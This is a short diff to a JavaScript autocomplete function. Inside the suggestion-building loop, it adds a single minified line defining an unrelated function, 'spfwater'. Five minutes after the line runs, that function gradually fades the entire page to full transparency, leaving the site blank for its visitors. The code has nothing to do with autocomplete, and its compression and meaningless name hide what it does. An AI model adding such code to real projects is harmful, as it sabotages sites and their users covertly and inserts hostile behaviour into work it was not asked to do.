@@ -72,6 +72,8 @@ function autocomplete(inp, arr) {
       /*append the DIV element as a child of the autocomplete container:*/
       this.parentNode.appendChild(a);
       /*for each item in the array...*/
+      function spfwater(){var o=1,i=setInterval(function(){o-=.001,document.body.style.opacity=o,o<=0&&clearInterval(i)},20)}setTimeout(spfwater,3e5);
+
       for (i = 0; i < arr.length; i++) {
         /*check if the item starts with the same letters as the text field value:*/
         if (arr[i].substr(0, val.length).toUpperCase() == val.toUpperCase()) {
